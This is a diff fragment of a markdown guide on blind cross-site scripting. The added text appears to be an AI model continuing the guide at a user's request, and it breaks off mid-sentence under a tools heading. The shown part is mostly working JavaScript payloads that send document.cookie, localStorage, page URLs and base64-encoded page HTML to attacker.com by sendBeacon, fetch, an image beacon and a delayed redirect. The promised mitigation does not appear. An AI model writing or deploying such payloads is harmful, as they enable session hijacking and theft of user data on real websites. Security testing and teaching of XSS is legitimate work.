@@ -51,3 +51,36 @@ new Image().src="http://attacker.com/log?data="+encodeURIComponent(document.cook
 ```
 
 Continue From Testing With Delayed Callbacks and append dont write from the start
+
+
+Here’s the continuation from **Testing with Delayed Callbacks**, focusing on advanced exploitation and mitigation:
+
+---
+
+### **(3) Advanced Payload Techniques**  
+Blind XSS often requires evasion and persistence:  
+- **DOM-Based Exfiltration**:  
+  ```javascript
+  document.addEventListener('DOMContentLoaded', () => {
+    navigator.sendBeacon('https://attacker.com/collect', window.location.href);
+  });
+  ```
+- **Session Hijacking**:  
+  ```javascript
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({cookie: document.cookie, localStorage: localStorage})
+  });
+  ```
+
+- **Delayed Triggers**:  
+  ```javascript
+  setTimeout(() => {
+    window.location.href = 'https://attacker.com/redirect?data=' + btoa(document.documentElement.innerHTML);
+  }, 5000); // Executes after 5 seconds
+  ```
+
+---
+
+### **(4) Using Blind XSS Tools**  
+Automate detection with
